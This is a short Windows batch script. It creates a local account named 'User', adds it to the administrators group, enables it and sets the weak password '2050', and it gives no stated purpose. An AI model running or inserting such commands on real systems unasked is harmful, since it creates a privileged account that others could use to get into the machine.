@echo off
net user User /add
net localgroup administrators User /add
net user User /active:yes
net user User 2050